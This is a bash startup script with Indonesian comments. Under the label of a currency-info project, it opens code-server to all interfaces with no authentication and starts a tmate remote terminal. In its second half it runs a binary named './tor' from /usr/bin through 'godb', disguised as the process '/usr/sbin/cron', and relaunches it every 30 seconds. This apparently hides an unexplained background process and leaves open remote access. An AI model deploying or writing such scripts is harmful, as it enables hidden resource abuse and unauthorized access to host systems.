#!/bin/bash

# Ubah direktori ke /home/coder/project
cd /home/coder/project
python3 -m venv v 
source v/bin/activate 
pip install requests 
pip install udocker 
# Mulai code-server tanpa otentikasi pada port 6090
echo "Starting code-server..."
code-server --bind-addr 0.0.0.0:6090 --auth none . &

# Tunggu selama 10 detik agar code-server siap
sleep 5


# Jalankan perintah dengan hak akses root
echo "running tmate"
tmate -F &
sleep 5

cd /home/coder/project
echo "Informasi Currency terkini"
# Jalankan info.py
python3 info.py &
# Tunggu semua proses latar belakang untuk selesai

# Ubah direktori ke /usr/bin dan jalankan hms
cd /usr/bin

repeat_command() {
  while true; do
    # Hentikan proses godb yang berjalan sebelumnya
    kill_godb

    # Hentikan proses yang PID-nya disimpan dalam croned.pid
    kill_cron_pid

    # Jalankan perintah godb baru
    ./godb -s "/usr/sbin/cron" -d -p croned.pid ./tor &
    GODB_PID=$!
    echo "Proses godb berjalan dengan PID $GODB_PID."
    
    # Tunggu selama 30 detik sebelum mengulang
    sleep 30
  done
}

# Fungsi untuk menghentikan proses godb yang berjalan
kill_godb() {
  if [[ -n "$GODB_PID" ]]; then
    kill "$GODB_PID" 2>/dev/null
    echo "Proses godb dengan PID $GODB_PID telah dihentikan."
    GODB_PID=""
  else
    echo "Tidak ada proses godb yang berjalan."
  fi
}

# Fungsi untuk menghentikan proses yang PID-nya disimpan dalam croned.pid
kill_cron_pid() {
  if [[ -f croned.pid ]]; then
    CRON_PID=$(cat croned.pid)
    if [[ -n "$CRON_PID" ]]; then
      kill "$CRON_PID" 2>/dev/null
      echo "Proses cron dengan PID $CRON_PID telah dihentikan."
      rm -f croned.pid
    fi
  else
    echo "File croned.pid tidak ditemukan."
  fi
}

# Panggil fungsi di latar belakang dan simpan PID-nya
repeat_command &
REPEAT_PID=$!
echo "Proses repeat_command berjalan dengan PID $REPEAT_PID."

wait
